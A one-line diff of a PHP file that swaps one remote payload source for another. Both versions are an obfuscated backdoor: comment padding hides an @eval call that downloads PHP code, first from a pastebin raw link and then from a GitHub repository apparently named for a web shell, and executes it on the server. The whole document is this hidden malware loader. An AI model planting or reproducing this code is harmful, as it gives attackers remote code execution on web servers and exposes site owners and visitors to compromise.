@@ -1,1 +1,1 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://pastebin.com/raw/uxdgXyx1"));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/MltrCyber/ShellGntx/main/1.php"));/**/?>
